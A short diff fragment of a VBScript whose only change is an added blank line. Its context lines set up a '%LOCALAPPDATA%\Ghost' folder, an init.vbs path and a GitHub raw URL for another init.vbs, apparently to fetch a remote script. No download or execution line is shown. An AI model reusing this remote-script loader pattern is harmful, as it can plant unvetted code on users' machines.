@@ -1,6 +1,7 @@
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
+
 ghostDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Ghost"
 initPath = ghostDir & "\init.vbs"
 url = "https://raw.githubusercontent.com/dakj0326/ghost/main/init.vbs"
